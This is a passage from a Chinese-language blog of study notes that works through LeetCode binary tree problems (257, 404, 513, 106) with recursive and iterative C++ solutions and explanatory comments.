class="built_in">size</span>();<span class="comment">//本层 结点个数</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                TreeNode *node = que.<span class="built_in">front</span>();</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">                count++;<span class="comment">//遍历一个结点 个数+1</span></span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">                    que.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="257-二叉树的所有路径"><a href="#257-二叉树的所有路径" class="headerlink" title="257 二叉树的所有路径"></a>257 二叉树的所有路径</h3><p>路径是从 <strong>根节点</strong> 开始的——&gt;<strong>前序遍历</strong><br><img src="https://img-blog.csdnimg.cn/7f8f0e29651247e796b1e99590858c22.png"><br><img src="https://img-blog.csdnimg.cn/538077e242ed4c9ebe31672adb242000.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    递归</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//这里的参数 string path</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">paths_find</span><span class="params">(TreeNode *root, string path, vector&lt;string&gt;&amp; paths)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            path += <span class="built_in">to_string</span>(root-&gt;val);<span class="comment">//转字符串</span></span><br><span class="line">            <span class="comment">//当前结点是叶子结点，路径走到底了，把当前这条路径path加入结果集paths中</span></span><br><span class="line">            <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">                paths.<span class="built_in">push_back</span>(path);</span><br><span class="line">            <span class="keyword">else</span>&#123;<span class="comment">//当前结点不是叶子结点，路径没有走到头，继续扩展path</span></span><br><span class="line">                path += <span class="string">&quot;-&gt;&quot;</span>;</span><br><span class="line">                <span class="built_in">paths_find</span>(root-&gt;left,path,paths);</span><br><span class="line">                <span class="built_in">paths_find</span>(root-&gt;right,path,paths);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; paths;<span class="comment">//结果集</span></span><br><span class="line">        string path = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="built_in">paths_find</span>(root,path,paths);</span><br><span class="line">        <span class="keyword">return</span> paths;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    // path += &quot;-&gt;&quot;;</span></span><br><span class="line"><span class="comment">    paths_find(root-&gt;left,path+&quot;-&gt;&quot;,paths);</span></span><br><span class="line"><span class="comment">    paths_find(root-&gt;right,path+&quot;-&gt;&quot;,paths);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代-队列</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">binaryTreePaths</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">       queue&lt;TreeNode*&gt; node_q; <span class="comment">//结点队列</span></span><br><span class="line">       queue&lt;string&gt; path_q;    <span class="comment">//路径队列</span></span><br><span class="line">       <span class="keyword">if</span>(root)&#123;</span><br><span class="line">           node_q.<span class="built_in">push</span>(root);</span><br><span class="line">           path_q.<span class="built_in">push</span>(<span class="string">&quot;&quot;</span>+<span class="built_in">to_string</span>(root-&gt;val));</span><br><span class="line">       &#125;</span><br><span class="line">       vector&lt;string&gt; res;<span class="comment">//结果集</span></span><br><span class="line">       <span class="keyword">while</span>(!node_q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">           TreeNode *node = node_q.<span class="built_in">front</span>();</span><br><span class="line">           node_q.<span class="built_in">pop</span>();</span><br><span class="line">           string path = path_q.<span class="built_in">front</span>();</span><br><span class="line">           path_q.<span class="built_in">pop</span>();</span><br><span class="line">           <span class="keyword">if</span>(node-&gt;left==<span class="literal">nullptr</span> &amp;&amp; node-&gt;right==<span class="literal">nullptr</span>)<span class="comment">//是叶子结点，则装入结果集</span></span><br><span class="line">                res.<span class="built_in">push_back</span>(path);</span><br><span class="line">           <span class="keyword">if</span>(node-&gt;left)&#123;</span><br><span class="line">               node_q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">               path_q.<span class="built_in">push</span>(path+<span class="string">&quot;-&gt;&quot;</span>+<span class="built_in">to_string</span>(node-&gt;left-&gt;val));</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">if</span>(node-&gt;right)&#123;</span><br><span class="line">               node_q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">               path_q.<span class="built_in">push</span>(path+<span class="string">&quot;-&gt;&quot;</span>+<span class="built_in">to_string</span>(node-&gt;right-&gt;val));</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; </span><br><span class="line">       <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="404-左叶子之和"><a href="#404-左叶子之和" class="headerlink" title="404 左叶子之和"></a>404 左叶子之和</h3><p><strong>难点：如何判断是左叶子？</strong><br>判断当前节点是不是左叶子是<strong>无法判断</strong>的，必须要通过节点的父节点来判断其左孩子是不是左叶子。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归 不好理解</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">leftSum</span><span class="params">(TreeNode *root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left!=<span class="literal">nullptr</span> &amp;&amp; root-&gt;left-&gt;left==<span class="literal">nullptr</span> &amp;&amp; root-&gt;left-&gt;right==<span class="literal">nullptr</span>)&#123;<span class="comment">//左叶子</span></span><br><span class="line">            sum = root-&gt;left-&gt;val;<span class="comment">//root-&gt;left是左叶子</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">            left = <span class="built_in">leftSum</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">            right = <span class="built_in">leftSum</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> sum+left+right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">leftSum</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//迭代</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">sumOfLeftLeaves</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;<span class="comment">//和</span></span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            TreeNode *node = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="comment">//判断node-&gt;left是左叶子</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left!=<span class="literal">nullptr</span> &amp;&amp; node-&gt;left-&gt;left==<span class="literal">nullptr</span>&amp;&amp;node-&gt;left-&gt;right==<span class="literal">nullptr</span>)</span><br><span class="line">                sum += node-&gt;left-&gt;val;<span class="comment">//更新</span></span><br><span class="line">            <span class="keyword">if</span>(node-&gt;left)</span><br><span class="line">                q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">            <span class="keyword">if</span>(node-&gt;right)</span><br><span class="line">                q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="513-找树左下角的值"><a href="#513-找树左下角的值" class="headerlink" title="513 找树左下角的值"></a>513 找树左下角的值</h3><p>给定一个二叉树的 根节点 root，请找出该二叉树的【最底层 最左边节点】的值。<br>假设二叉树中至少有一个节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//递归+回溯</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> maxDepth = INT_MIN;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//当遇到叶子节点的时候，就需要统计一下最大的深度</span></span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">                maxDepth = depth;</span><br><span class="line">                result = root-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;left, depth + <span class="number">1</span>); <span class="comment">// 隐藏着回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;right, depth + <span class="number">1</span>); <span class="comment">// 隐藏着回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//学习 回溯【拆开 分析】  不懂！！！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> maxDepth = INT_MIN;</span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">traversal</span><span class="params">(TreeNode* root, <span class="keyword">int</span> depth)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left == <span class="literal">NULL</span> &amp;&amp; root-&gt;right == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (depth &gt; maxDepth) &#123;</span><br><span class="line">                maxDepth = depth;</span><br><span class="line">                result = root-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;left) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;left, depth);</span><br><span class="line">            depth--; <span class="comment">// 回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root-&gt;right) &#123;</span><br><span class="line">            depth++;</span><br><span class="line">            <span class="built_in">traversal</span>(root-&gt;right, depth);</span><br><span class="line">            depth--; <span class="comment">// 回溯</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">traversal</span>(root, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    迭代：层序遍历 【好理解】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findBottomLeftValue</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode*&gt; q;</span><br><span class="line">        <span class="keyword">if</span>(root)</span><br><span class="line">            q.<span class="built_in">push</span>(root);</span><br><span class="line">        <span class="keyword">int</span> left = root-&gt;val;</span><br><span class="line">        <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="keyword">int</span> size = q.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">                TreeNode *node = q.<span class="built_in">front</span>();</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;<span class="comment">//记录【每层 第一个结点】</span></span><br><span class="line">                    left = node-&gt;val;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;left)<span class="comment">//这里的顺序 还是：先左子树</span></span><br><span class="line">                    q.<span class="built_in">push</span>(node-&gt;left);</span><br><span class="line">                <span class="keyword">if</span>(node-&gt;right)<span class="comment">//后右子树</span></span><br><span class="line">                    q.<span class="built_in">push</span>(node-&gt;right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="106-从-中序-与-后序-遍历序列构造二叉树"><a href="#106-从-中序-与-后序-遍历序列构造二叉树" class="headerlink" title="106 从[中序]与[后序]遍历序列构造二叉树"></a>106 从[中序]与[后序]遍历序列构造二叉树</h2><p>给定两个整数数组 inorder 和 postorder ，其中 inorder 是二叉树的中序遍历， postorder 是同一棵树的后序遍历，请你构造并返回这颗 二叉树 。<br><img src="https://img-blog.csdnimg.cn/59fdfa2e08764f5999106cdb46866633.png"><br><strong>思路：</strong><br>    第一步：如果数组大小为零的话，说明是空节点了。</p><pre><code>第二步：如果不为空，那么取后序数组最后一个元素作为节点元素。第三步：找到后序数组最后一个元素在中序数组的位置，作为切割点第四步：【切割中序数组】，切成中序左数组和中序右数组 （顺序别搞反了，一定是先切中序数组）第五步：【切割后序数组】，切成后序左数组和后序右数组第六步：【递归】 处理左区间和右区间</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder,vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(postorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">int</span> rootValue = postorder[postorder.<span class="built_in">size</span>()<span class="number">-1</span>];<span class="comment">//确定树的 根节点：后序遍历的最后一个结点</span></span><br><span class="line">        TreeNode *root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);<span class="comment">//新建一结点，根节点确定为rootValue</span></span><br><span class="line">        <span class="keyword">if</span>(postorder.<span class="built_in">size</span>()==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> root;<span class="comment">//当后序遍历数组中 只剩下一个结点时，直接返回 该结点</span></span><br><span class="line">        <span class="keyword">int</span> IN_index;</span><br><span class="line">        <span class="keyword">for</span>(IN_index=<span class="number">0</span>;IN_index&lt;inorder.<span class="built_in">size</span>();IN_index++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(inorder[IN_index]==rootValue)</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">//寻找中序数组中 节点值等于rootValue 的点 的 位置（下标）</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//切割中序数组</span></span><br><span class="line">        <span class="comment">//中序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftInorder</span><span class="params">(inorder.begin(),inorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//中序 右区间：左闭右开[In_index + 1 , inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightInorder</span><span class="params">(inorder.begin()+IN_index+<span class="number">1</span>,inorder.end())</span></span>;</span><br><span class="line">        <span class="comment">//去掉 后序数组中 末尾元素</span></span><br><span class="line">        postorder.<span class="built_in">resize</span>(postorder.<span class="built_in">size</span>()<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//切割后序数组</span></span><br><span class="line">        <span class="comment">//后序 左区间：左闭右开[0,In_index)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">leftPostorder</span><span class="params">(postorder.begin(),postorder.begin()+IN_index)</span></span>;</span><br><span class="line">        <span class="comment">//后序 右区间：左闭右开[In_index,inorder.size()) [In_index,end)</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">rightPostorder</span><span class="params">(postorder.begin()+IN_index,postorder.end())</span></span>;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            后序切割中的 IN_index 可以改为 inorder.size()</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        root-&gt;left = <span class="built_in">traversal</span>(leftInorder,leftPostorder);</span><br><span class="line">        root-&gt;right = <span class="built_in">traversal</span>(rightInorder,rightPostorder);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">TreeNode* <span class="title">buildTree</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(inorder.<span class="built_in">size</span>()==<span class="number">0</span> || postorder.<span class="built_in">size</span>()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">traversal</span>(inorder,postorder);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//优化后，未看！！！！！（因为每层递归定义了新的vector（就是数组），既耗时又耗空间）</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// 中序区间：[inorderBegin, inorderEnd)，后序区间[postorderBegin, postorderEnd)</span></span><br><span class="line">    <span class="function">TreeNode* <span class="title">traversal</span> <span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; inorder, <span class="keyword">int</span> inorderBegin, <span class="keyword">int</span> inorderEnd, vector&lt;<span class="keyword">int</span>&gt;&amp; postorder, <span class="keyword">int</span> postorderBegin, <span class="keyword">int</span> postorderEnd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (postorderBegin == postorderEnd) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> rootValue = postorder[postorderEnd - <span class="number">1</span>];</span><br><span class="line">        TreeNode* root = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(rootValue);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (postorderEnd - postorderBegin == <span class="number">1</span>) <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> delimiterIndex;</span><br><span class="line">        <span class="keyword">for</span> (delimiterIndex = inorderBegin; delimiterIndex &lt; inorderEnd; delimiterIndex++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (inorder[delimiterIndex] == rootValue) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 切割中序数组</span></span><br><span class="line">        <span class="comment">// 左中序区间，左闭右开[leftInorderBegin, leftInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> leftInorderBegin = inorderBegin;</span><br><span class="line">        <span class="keyword">int</span> leftInorderEnd = delimiterIndex;</span><br><span class="line">        <span class="comment">// 右中序区间，左闭右开[rightInorderBegin, rightInorderEnd)</span></span><br><span class="line">        <span class="keyword">int</span> rightInorderBegin = delimiterIndex + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> rightInorderEnd = inorderEnd;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 切割后序数组</span></span><br><span class="line">        <span class="comment">// 左后序区间，左闭右开[leftPostorderBegin, 